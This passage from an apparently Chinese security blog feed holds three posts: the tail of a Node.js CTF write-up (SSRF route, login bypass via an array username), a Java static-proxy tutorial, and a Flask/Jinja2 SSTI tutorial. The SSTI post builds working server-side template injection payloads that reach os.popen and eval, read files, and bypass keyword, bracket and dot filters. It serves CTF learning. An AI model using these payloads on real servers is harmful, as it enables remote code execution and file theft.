axios.post(<span class="string">`http://127.0.0.1:<span class="subst">$&#123;port&#125;</span>/search?url=<span class="subst">$&#123;url&#125;</span>`</span>)</span><br><span class="line">  res.render(<span class="string">&#x27;base&#x27;</span>, <span class="string">&quot;Something needs to be implemented&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.all(<span class="string">&#x27;/search&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">!<span class="regexp">/127\.0\.0\.1/</span>.test(req.ip)</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.send(&#123;<span class="attr">title</span>: <span class="string">&#x27;Error&#x27;</span>, <span class="attr">content</span>: <span class="string">&#x27;You can only use proxy to aceess here!&#x27;</span>&#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> result = &#123;<span class="attr">title</span>: <span class="string">&#x27;Search Success&#x27;</span>, <span class="attr">content</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> method = req.method.toLowerCase()</span><br><span class="line">  <span class="keyword">const</span> url = <span class="built_in">decodeURI</span>(req.query.url)</span><br><span class="line">  <span class="keyword">const</span> data = req.body</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">method == <span class="string">&#x27;get&#x27;</span></span>)</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> response = <span class="keyword">await</span> axios.get(url)</span><br><span class="line">      result.content = formatResopnse(response.data)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="function"><span class="title">if</span>(<span class="params">method == <span class="string">&#x27;post&#x27;</span></span>)</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> response = <span class="keyword">await</span> axios.post(url, data)</span><br><span class="line">      result.content = formatResopnse(response.data)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      result.title = <span class="string">&#x27;Error&#x27;</span></span><br><span class="line">      result.content = <span class="string">&#x27;Unsupported Method&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="function"><span class="title">catch</span>(<span class="params">error</span>)</span> &#123;</span><br><span class="line">    result.title = <span class="string">&#x27;Error&#x27;</span></span><br><span class="line">    result.content = error.message</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res.json(result)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/source&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>)=&gt;</span>&#123;</span><br><span class="line">  res.sendFile( __dirname + <span class="string">&quot;/&quot;</span> + <span class="string">&quot;index.js&quot;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/flag&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">!<span class="regexp">/127\.0\.0\.1/</span>.test(req.ip)</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.send(&#123;<span class="attr">title</span>: <span class="string">&#x27;Error&#x27;</span>, <span class="attr">content</span>: <span class="string">&#x27;No Flag For You!&#x27;</span>&#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res.json(&#123;<span class="attr">hint</span>: hint&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router</span><br></pre></td></tr></table></figure>

<p>登陆部分的代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123;username, password&#125; = req.query;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">!username || !password || username === password || username.length === password.length || username === <span class="string">&#x27;admin&#x27;</span></span>)</span> &#123;</span><br><span class="line">    res.render(<span class="string">&#x27;login&#x27;</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> hash = sha256(sha256(salt + username) + sha256(salt + password))</span><br><span class="line"></span><br><span class="line">    req.session.admin = hash === adminHash</span><br><span class="line"></span><br><span class="line">    res.redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>题目要求含有username和password强等于，同时还要求强度不等，最后还不允许username的名字不是admin。</p>
<p>刚开始我就卡在这里了，后来学长推测和PHP的特性一样，试了一下果然pass掉了..</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> username = [<span class="string">&#x27;admin&#x27;</span>]</span><br><span class="line"><span class="keyword">var</span> password = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(username.length);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">if</span>(<span class="params">!username || !password || username === password || username.length === password.length || username === <span class="string">&#x27;admin&#x27;</span></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;false&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&#x27;yes&#x27;</span>);</span><br><span class="line">      </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//看来和PHP的特性差不多..准确来说这就是弱类型语言的特性，当两者进行比较的时候就会进行转换，同时当我们的尝试将数组和字符串组合起来的时候JS又可以正确的拼接</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> salt = <span class="string">&quot;nodejs8&quot;</span></span><br><span class="line"><span class="built_in">console</span>.log(username+salt);</span><br><span class="line"><span class="comment">//adminnodejs8</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>SSRF</tag>
        <tag>NodeJs</tag>
      </tags>
  </entry>
  <entry>
    <title>静态代理</title>
    <url>/2020/11/09/%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<p>好久没用了都有点忘了，现在捡起来学一下，之后还有用</p>
<h1 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h1><h2 id="结合出租房子理解"><a href="#结合出租房子理解" class="headerlink" title="结合出租房子理解"></a>结合出租房子理解</h2><p><img src="%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/image-20201109214003006.png" alt="image-20201109214003006"></p>
<p>通过图示，我们分析一个例子：</p>
<ul>
<li>客户需要租一个房子</li>
<li>房东需要租出房子</li>
</ul>
<p>这个时候两者之间的合同很纯粹，如果两者认识，就不需要中介，直接对接把房子租出去就很简单很快了对吧？但是现实往往不是这样，更可能的是如下情况：</p>
<ul>
<li>房东和客户互不相识，需要签订各种合同保证对方不会后悔</li>
<li>一个客户肯定不会只看房子，他需要看多个房子来选择自己心仪的房子</li>
<li>房东不可能时时刻刻都守着房子，等一个一个的客户上门来看</li>
</ul>
<p>在这种情况下，用户的需求和房东的客户都相当不纯粹了，需要经过很多步骤才可以转换到位</p>
<p><img src="%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/image-20201109214714721.png" alt="image-20201109214714721"></p>
<p>在现实生活中，正是由于这种情况的出现，所以出现了房屋中介，解决各种客户的情况，由房屋中介来给客户们解决各种问题，经过中介处理，双方的情况又变得纯粹了起来，而繁琐的事情交给中介来处理即可</p>
<p><img src="image-20201109214848811.png" alt="image-20201109214848811"></p>
<p>而代码一样如此，这种情况的出现几乎处处可见，比如我们可能需要处理数据库，中间需要对数据进行各种处理，这种情况就和上面的合同一样。</p>
<p>话说回来，我们如何处理租房子的情况呢？这里我写了一小段代码来做出范例：</p>
<p>我们可以将这个事情抽象成四个part：</p>
<ul>
<li>出租房子这件事情</li>
<li>谁出租？ 房东</li>
<li>谁要房子？ 客户</li>
<li>谁来处理复杂情况？ 中介</li>
</ul>
<p>分析完之后我们可以着手于代码</p>
<p>出租房子这件事情：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Rent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rent</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>房东:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Host</span> <span class="keyword">implements</span> <span class="title">Rent</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;房东租出房子&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>中介：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyProxy</span> <span class="keyword">implements</span> <span class="title">Rent</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Host host;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyProxy</span><span class="params">(Host host)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.host = host;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        seeHouse();</span><br><span class="line">        host.rent();</span><br><span class="line">        takeMoney();</span><br><span class="line">        giveMoney();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">seeHouse</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;中介带你看房子&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">takeMoney</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;中介收你钱&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">giveMoney</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;中介给钱给房东&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        MyProxy proxy = <span class="keyword">new</span> MyProxy(<span class="keyword">new</span> Host());</span><br><span class="line">        proxy.rent();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在上面的例子当中，我们可以发现，静态代理帮我们完成了如下事情：</p>
<ol>
<li>使得需要再次明确起来，无论是客户还是房东，需求都变得相当简单</li>
<li>复杂的事情交给了中介来做</li>
</ol>
<p>但是我们也发现了一个缺点：</p>
<ol>
<li>我们的代码量明显提升了很多，相比于直接添加功能</li>
<li>除此之外，如果客户很多，我们不得不手动添加一个个客户，工作量更大了。</li>
</ol>
<h2 id="结合增删改查事务理解"><a href="#结合增删改查事务理解" class="headerlink" title="结合增删改查事务理解"></a>结合增删改查事务理解</h2><p>在上面的例子中，我们学习到了代理模式的第一个好处，接下的例子将进一步表露出上面的设计模式的好处，并且它会展现静态代理的第二个好处，<strong>添加新功能而不修改原有代码</strong></p>
<p>增删改查事务：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>业务实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImp</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;增添了一个新用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;删除了一个用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;更新了一个用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;查询了一个用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这时候我们突然想要添加新功能，打印我们使用了什么功能改怎么办？我们很明显可以这样做：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     System.out.println(<span class="string">&quot;使用了查询功能&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;查询了一个用户&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>但是很明显这种方式非常笨拙，并且如果是更多的功能，程序员就必须手写，并且一段一段的复制差不多的代码！（这里四个输出语句就让我感觉有点烦躁了</p>
<p>我们结合代理模式，其实可以很优雅的解决它：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceProxy</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserServiceImp userServiceImp;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserServiceImp</span><span class="params">(UserServiceImp userServiceImp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userServiceImp = userServiceImp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;add&quot;</span>);</span><br><span class="line">        userServiceImp.add();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;删除&quot;</span>);</span><br><span class="line">        userServiceImp.delete();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;更新&quot;</span>);</span><br><span class="line">        userServiceImp.update();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;查询&quot;</span>);</span><br><span class="line">        userServiceImp.query();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">log</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[DEBUG]执行了&quot;</span>+name+<span class="string">&quot;方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这时候我们就解决了功能的需求，并且，<strong>我们没有修改任何一行原代码</strong>，却上线了新的功能，除此之外，我们的代码拓展性依然很高，需要添加新功能只需要添加新的代理层即可，这时候我们将引出了第三个思想：</p>
<p><strong>任何功能的添加，修改，引入新的代理层来解决，客户只需要去导入最后一个代理增即可</strong></p>
]]></content>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>FlaskSSti</title>
    <url>/2020/10/27/FlaskSSti/</url>
    <content><![CDATA[<p>一直对ssti比较模糊，遇见的时候都是网上去照抄payload去打，自己没有什么主动构造payload的能力，这次遇见一道题决定总结一些该怎么做</p>
<a id="more"></a>

<h1 id="1-hackbar-自带的payload如何构成的"><a href="#1-hackbar-自带的payload如何构成的" class="headerlink" title="1.hackbar 自带的payload如何构成的"></a>1.hackbar 自带的payload如何构成的</h1><p>第一件事情，就是搭建我们的环境：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="built_in">id</span> = request.args.get(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">    html = <span class="string">&#x27;&#x27;&#x27;&lt;h1&gt;%s&lt;/h1&gt; &#x27;&#x27;&#x27;</span> % (<span class="built_in">id</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这种就是最基本的flask，在flask当中jinjia的模板，我们使用两个花括号就可以允许一些基本的运算 用于执行if，for循环等等，那么我们一个最基本的payload的构造方式是该怎么触发呢？第一步，从config类触发，因为Flask里面自带</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://localhost/?id=&#123;&#123; config.items() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="F:\MyGitBlog\themes\diaspora\source\img\image-20201026173228975.png" alt="image-20201026173228975"></p>
<p>通过这个类我们可以得到所有的flask的config~，而这一的意义好像不是很大？我们得不到很多东西，但是我们可以用这个作为跳板，执行下一步</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">.__class__.__init__</span><br></pre></td></tr></table></figure>

<p>__class方法属性的时候会只想该实例对应的类，此时config的类是Config,然后可以再去调用其它类属性，如果我们审计了源码，就可以知道我们此时的Config类位于config.py80多行，当我们执行__init__之后，便可以在下面的101行找到这么一行代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rv = os.environ.get(variable_name)</span><br></pre></td></tr></table></figure>

<p>也就是说，我们的config类当中含有os库的方法，如果我们直接使用是不行的，但我们可以通过globals函数先获取到它，于是得到：</p>
<p><strong>globals()</strong> 函数会以字典类型返回当前位置的全部全局变量,在交互模式下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__globals__</span><br></pre></td></tr></table></figure>

<p>于是我们拼接得到如下的payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config.__class__.__init__.__globals__</span><br></pre></td></tr></table></figure>

<p>可以得到：</p>
<p><img src="F:\MyGitBlog\themes\diaspora\source\img\image-20201026175828323.png" alt="image-20201026175828323"></p>
<p>我们用下面这个方式来获取os库，利用__dict这个方法来查看os库哪些可以给我们进行使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">.__globals__[<span class="string">&#x27;os&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>我们能够找到system，但是我们用该方法却无法得到回显，该方法只不过是成功的时候返回1，失败了则是返回0</p>
<p>执行如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://localhost/</span><br><span class="line">?id=&#123;&#123;%20config.__class__.__init__.__globals__[&#x27;os&#x27;].system(&#x27;dir()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>得到1或者0对于我们来说意义不大，当然这样也可以进行盲注【，而popen则可以返回文件对象</p>
<p><strong>os.popen</strong> </p>
<p>　　该方法不但执行命令还返回执行后的信息对象，是通过一个管道文件将结果返回。</p>
<p>　　output = os.popen(‘cat /proc/cpuinfo’)</p>
<p>　　print output.read()</p>
<p>于是我们构造最终的payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;dir()&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="1-2-config以外的思路"><a href="#1-2-config以外的思路" class="headerlink" title="1.2 config以外的思路"></a>1.2 config以外的思路</h2><p>其他的一些思路，首先，我们的config被过滤了，我们该怎么办呢？除此之外，我们还可以通过()和’’分别获取到tuple和str的初始化~</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__name__  <span class="comment">#得到str</span></span><br><span class="line">()_.__class__.__name__ <span class="comment">#tuple</span></span><br></pre></td></tr></table></figure>

<p>这时引入base和mro的魔术方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bases : 类的基类的元组，顺序为它们在基类列表中出现的顺序（基类就是Object类~）</span><br><span class="line">mro :类的父类，从父类网上找，最终会找到基类，所以mro[<span class="number">-1</span>]等价于__bases__</span><br></pre></td></tr></table></figure>

<p><img src="F:\MyGitBlog\themes\diaspora\source\img\image-20201026184448939.png" alt="image-20201026184448939"></p>
<p>这时候我们就想到的，我们既然得到了基类，是不是就想要所有的子类了呢？毕竟子类的内容我们更加感兴趣，我们最终的目标就是找到os库对吧。而python正好拥有这个魔术方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__subclasses__ <span class="comment">#获取所有的子类方法</span></span><br></pre></td></tr></table></figure>

<p>之后慢慢去寻找即可，该文章中有，在catch_warnnings模块下含有builtins，我们可以用这个去找eval：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__mro__[-1].__subclasses__()[192].__init__.__globals__. __builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;dir()&#39;).read()&quot;)    &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>补充思路：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="string">&quot;catch_warnings&quot;</span>].__init__.__globals__.__builtins__[<span class="string">&quot;eval&quot;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)  &#125;&#125;</span><br></pre></td></tr></table></figure>







<h2 id="1-3总结做题的思路："><a href="#1-3总结做题的思路：" class="headerlink" title="1.3总结做题的思路："></a>1.3总结做题的思路：</h2><p>总而言之，我们要么去找builtins函数下的eval，要么去找os。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str&#x3D; %EF%B9%9B%EF%B9%9Bself.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(request.args.x1).read()%EF%B9%9C%EF%B9%9C</span><br></pre></td></tr></table></figure>



<h1 id="2-谈谈过滤"><a href="#2-谈谈过滤" class="headerlink" title="2.谈谈过滤"></a>2.谈谈过滤</h1><p>在某些情况下，会遇见各种各样的过滤，比如我们遇见对config的过滤，以及os过滤啊等等</p>
<h2 id="2-1-过滤了os，system等的情况"><a href="#2-1-过滤了os，system等的情况" class="headerlink" title="2.1 过滤了os，system等的情况"></a>2.1 过滤了os，system等的情况</h2><p>在这种情况下我们也不需慌，如果只是对中括号中可能用到的内容进行过滤的话，我们完全可以通过拼接绕过：</p>
<p>比如我们之前的payload修改成：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?id=&#123;&#123; config.__init__.__globals__[&#x27;o&#x27;+&#x27;s&#x27;].popen(&#x27;dir&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-2-过滤了中括号"><a href="#2-2-过滤了中括号" class="headerlink" title="2.2 过滤了中括号"></a>2.2 过滤了中括号</h2><p>这样的话,可以用getitem方法，该方法等价于一个迭代器的选择，开发者的原意是让人们可以用这个迭代对象,这篇文章讲的不错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_24805141&#x2F;article&#x2F;details&#x2F;81411775</span><br></pre></td></tr></table></figure>

<p>Python的魔法方法<code>__getitem__</code> 可以让对象实现迭代功能，这样就可以使用<code>for...in...</code> 来迭代该对象了，同时也允许我们利用gettiem来直接选择内容,所以我们之前的payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; config.__init__.__globals__.__getitem__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;dir()&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>利用request起步</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; request.__class__.__mro__.__getitem__(<span class="number">-1</span>).__subclasses__().__getitem__(<span class="number">192</span>).__init__.__globals__.__builtins__.__getitem__(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()&quot;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-3-过滤了-号"><a href="#2-3-过滤了-号" class="headerlink" title="2.3 过滤了.号"></a>2.3 过滤了.号</h2><p>这个可以使用attr来进行绕过了，直接给出绕过方法：</p>
<p>所以之前的payload进行对比：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[].__class__ = []|attr(__class__)</span><br><span class="line">&#123;&#123;[]|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)()  &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;   ([]|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)())[<span class="number">190</span>]  &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;   ([]|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)())[<span class="number">192</span>]|attr(<span class="string">&#x27;__init__&#x27;</span>)|attr(<span class="string">&#x27;__globals__&#x27;</span>)|attr(<span class="string">&#x27;__builtins__&#x27;</span>)|attr(__getitem__)(<span class="string">&#x27;eval&#x27;</span>)  &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>不知道为什么在我从上往下继续取值的时候，怎么都没法继续向下取值了。但是看见可以转换思路</p>
<h2 id="2-5利用request"><a href="#2-5利用request" class="headerlink" title="2.5利用request"></a>2.5利用request</h2><p>​    因为flask此时能允许用户自定义输出，十有八九是有request的，所以我们去利用这个也不是相当不错的</p>
<p>这里翻阅到了一个老外思路，但是他没给全。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://localhost/?id=&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)|attr(&#x27;__base__&#x27;)      &#125;&#125;&amp;class=class&amp;usc=_&amp;init=init</span><br></pre></td></tr></table></figure>
